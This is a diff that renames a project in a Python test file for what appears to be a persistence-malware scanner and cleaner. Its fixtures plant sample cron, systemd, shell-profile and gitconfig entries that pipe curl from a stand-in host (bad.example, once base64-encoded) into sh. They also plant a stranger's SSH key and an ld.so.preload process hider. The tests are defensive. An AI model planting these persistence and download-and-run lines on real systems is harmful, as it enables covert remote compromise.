@@ -7,11 +7,11 @@ import sys
 import time
 import unittest
 
-from repoguard import pc, pcclean
+from gitwarden import pc, pcclean
 from tests.helpers import tmpdir, write
 
 FAKE_CRONTAB = """#!/bin/sh
-f="$REPOGUARD_TEST_CRON"
+f="$GITWARDEN_TEST_CRON"
 case "$1" in
   -l) [ -f "$f" ] && cat "$f" && exit 0; echo "no crontab for you" >&2; exit 1 ;;
   -) cat > "$f" ;;
@@ -19,7 +19,7 @@ case "$1" in
 esac
 """
 FAKE_SYSTEMCTL = """#!/bin/sh
-echo "$*" >> "$REPOGUARD_TEST_SYSTEMCTL_LOG"
+echo "$*" >> "$GITWARDEN_TEST_SYSTEMCTL_LOG"
 case "$*" in *is-enabled*) echo enabled ;; *is-active*) echo active ;; esac
 exit 0
 """
@@ -38,7 +38,7 @@ class PCTest(unittest.TestCase):
         self.home, self.etc, self.fake_tmp = (os.path.join(r, x) for x in ("home", "etc", "faketmp"))
         for d in (self.home, self.etc, self.fake_tmp, os.path.join(r, "state")):
             os.makedirs(d)
-        os.environ["REPOGUARD_STATE"] = os.path.join(r, "state")
+        os.environ["GITWARDEN_STATE"] = os.path.join(r, "state")
         self.saved = (pc.HOME, pc.ETC, pc.TEMP_DIRS, pc.CRONTAB, pcclean.SYSTEMCTL)
         pc.HOME, pc.ETC, pc.TEMP_DIRS = self.home, self.etc, [self.fake_tmp]
         for name, body in (("crontab", FAKE_CRONTAB), ("systemctl", FAKE_SYSTEMCTL)):
@@ -47,8 +47,8 @@ class PCTest(unittest.TestCase):
                 fh.write(body)
             os.chmod(path, 0o755)
         pc.CRONTAB, pcclean.SYSTEMCTL = os.path.join(r, "crontab"), os.path.join(r, "systemctl")
-        os.environ["REPOGUARD_TEST_CRON"] = os.path.join(r, "cron.txt")
-        os.environ["REPOGUARD_TEST_SYSTEMCTL_LOG"] = os.path.join(r, "systemctl.log")
+        os.environ["GITWARDEN_TEST_CRON"] = os.path.join(r, "cron.txt")
+        os.environ["GITWARDEN_TEST_SYSTEMCTL_LOG"] = os.path.join(r, "systemctl.log")
         self.proc = None
 
     def tearDown(self):
@@ -61,7 +61,7 @@ class PCTest(unittest.TestCase):
 
     def plant(self):
         h = self.home
-        with open(os.environ["REPOGUARD_TEST_CRON"], "w") as fh:
+        with open(os.environ["GITWARDEN_TEST_CRON"], "w") as fh:
             fh.write(f"# backups\n0 3 * * * /usr/bin/backup.sh\n*/5 * * * * {DOWNLOAD_RUN}\n")
         write(h, ".config/systemd/user/update-helper.service",
               f"[Service]\nExecStart=/bin/sh -c '{DOWNLOAD_RUN}'\n[Install]\nWantedBy=default.target\n")
@@ -71,7 +71,7 @@ class PCTest(unittest.TestCase):
                             "eval \"$(echo Y3VybCBodHRwOi8vYmFkLmV4YW1wbGUveC5zaHxzaA== | base64 -d | sh)\"\n")
         write(h, ".ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIStranger stranger@vps\n")
         write(h, ".gitconfig", "[user]\n\tname = me\n[core]\n\tsshCommand = sh -c 'curl -s http://bad.example | sh'\n"
-                               "\thooksPath = /home/me/.local/share/repoguard/githooks\n")
+                               "\thooksPath = /home/me/.local/share/gitwarden/githooks\n")
         write(h, ".npmrc", "registry=https://registry.npmjs.org/\nscript-shell=/tmp/.npm/sh\n")
         write(h, ".config/Code/User/settings.json", '{\n  "editor.fontSize": 14,\n  "task.allowAutomaticTasks": "on"\n}\n')
         write(self.etc, "ld.so.preload", "/usr/lib/libprocesshider.so\n")
@@ -108,7 +108,7 @@ class PCTest(unittest.TestCase):
 
     def test_finds_everything_planted(self):
         miner = self.plant()
-        k = self.by_kind(self.scan(own_hooks="/home/me/.local/share/repoguard/githooks"))
+        k = self.by_kind(self.scan(own_hooks="/home/me/.local/share/gitwarden/githooks"))
         danger = lambda kind: [f for f in k.get(kind, []) if f["severity"] == "danger"]  # noqa: E731
         self.assertEqual([f["detail"] for f in danger("cron")], [f"*/5 * * * * {DOWNLOAD_RUN}"])
         self.assertEqual(len(danger("systemd")), 1)
@@ -128,23 +128,23 @@ class PCTest(unittest.TestCase):
 
     def test_fix_everything_then_undo(self):
         miner = self.plant()
-        found = self.scan(own_hooks="/home/me/.local/share/repoguard/githooks")
+        found = self.scan(own_hooks="/home/me/.local/share/gitwarden/githooks")
         bashrc_before = _read(os.path.join(self.home, ".bashrc"))
         res = pcclean.apply([f for f in found if f["severity"] == "danger"])
         self.proc.wait(timeout=5)
         self.assertIsNotNone(self.proc.returncode, "the program running from temp was stopped")
         self.assertFalse(os.path.exists(miner))
-        self.assertNotIn("bad.example", _read(os.environ["REPOGUARD_TEST_CRON"]))
-        self.assertIn("/usr/bin/backup.sh", _read(os.environ["REPOGUARD_TEST_CRON"]), "other cron lines kept")
+        self.assertNotIn("bad.example", _read(os.environ["GITWARDEN_TEST_CRON"]))
+        self.assertIn("/usr/bin/backup.sh", _read(os.environ["GITWARDEN_TEST_CRON"]), "other cron lines kept")
         self.assertFalse(os.path.exists(os.path.join(self.home, ".config/systemd/user/update-helper.service")))
-        self.assertIn("--user disable --now update-helper.service", _read(os.environ["REPOGUARD_TEST_SYSTEMCTL_LOG"]))
+        self.assertIn("--user disable --now update-helper.service", _read(os.environ["GITWARDEN_TEST_SYSTEMCTL_LOG"]))
         self.assertFalse(os.path.exists(os.path.join(self.home, ".config/autostart/helper.desktop")))
         self.assertTrue(os.path.exists(os.path.join(self.home, ".config/autostart/slack.desktop")), "review items untouched")
         self.assertEqual(_read(os.path.join(self.home, ".bashrc")), "alias ll='ls -l'\nexport PATH=$HOME/bin:$PATH\n")
         self.assertNotIn("sshCommand", _read(os.path.join(self.home, ".gitconfig")))
         self.assertNotIn("allowAutomaticTasks", _read(os.path.join(self.home, ".config/Code/User/settings.json")))
         self.assertIn(("A library is forced into every program", ), [(t,) for t, _ in res["skipped"]] or [("",)])
-        left = [f for f in self.scan(own_hooks="/home/me/.local/share/repoguard/githooks")
+        left = [f for f in self.scan(own_hooks="/home/me/.local/share/gitwarden/githooks")
                 if f["severity"] == "danger" and f["kind"] != "preload"]
         self.assertEqual(left, [])
         for dirpath, _, names in os.walk(res["undo"]):
@@ -154,9 +154,9 @@ class PCTest(unittest.TestCase):
         out = pcclean.restore(res["undo"])
         self.assertGreater(out["files"], 5)
         self.assertEqual(_read(os.path.join(self.home, ".bashrc")), bashrc_before)
-        self.assertIn("bad.example", _read(os.environ["REPOGUARD_TEST_CRON"]))
+        self.assertIn("bad.example", _read(os.environ["GITWARDEN_TEST_CRON"]))
         self.assertTrue(os.path.exists(os.path.join(self.home, ".config/systemd/user/update-helper.service")))
-        self.assertIn("--user enable update-helper.service", _read(os.environ["REPOGUARD_TEST_SYSTEMCTL_LOG"]))
+        self.assertIn("--user enable update-helper.service", _read(os.environ["GITWARDEN_TEST_SYSTEMCTL_LOG"]))
         self.assertTrue(os.path.exists(miner))
         self.assertTrue(os.access(miner, os.X_OK), "restored with its original mode")
 
